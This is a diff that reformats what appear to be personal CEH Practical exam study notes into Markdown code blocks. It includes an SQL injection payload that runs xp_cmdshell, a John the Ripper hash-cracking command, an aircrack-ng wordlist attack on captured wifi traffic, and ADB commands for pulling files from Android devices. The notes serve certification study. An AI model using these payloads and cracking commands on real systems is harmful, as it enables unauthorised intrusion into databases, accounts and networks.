@@ -122,23 +122,27 @@ Execute cmd from login
 •	blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
 ```
 
-=== PASSWORD CRACKING ===
+# PASSWORD CRACKING 
 
+## john
+
+```console
 john --single --format=md5crypt crack.txt
+```
 
-=== WIFI ENCYRPTION CRACKING ===
-
+# WIFI ENCYRPTION CRACKING 
+```console
 aircrack-ng -w rockyou.txt capture-01.cap
+```
+# VERACRYPT 
 
 
-=== VERACRYPT ===
+# CUSTOM WORDLIST 
 
+# MOBILE 
 
-=== CUSTOM WORDLIST ===
-
-=== MOBILE ===
-
-ADB
+## ADB
+```console
 To Install ADB
 apt-get update
 sudo apt-get install adb -y
@@ -156,9 +160,10 @@ cd sdcard
 Download a File from Android using ADB tool
 adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
 adb pull sdcard/log.txt /home/mmurphy/Desktop
+```
 
 == resources ==
 
 https://github.com/nirangadh/ceh-practical/blob/main/module03-Scanning-Networks.txt
-https://github.com/Samson-DVS/CEH-Practical-Notes/tree/main
+*https://github.com/Samson-DVS/CEH-Practical-Notes/tree/main
 
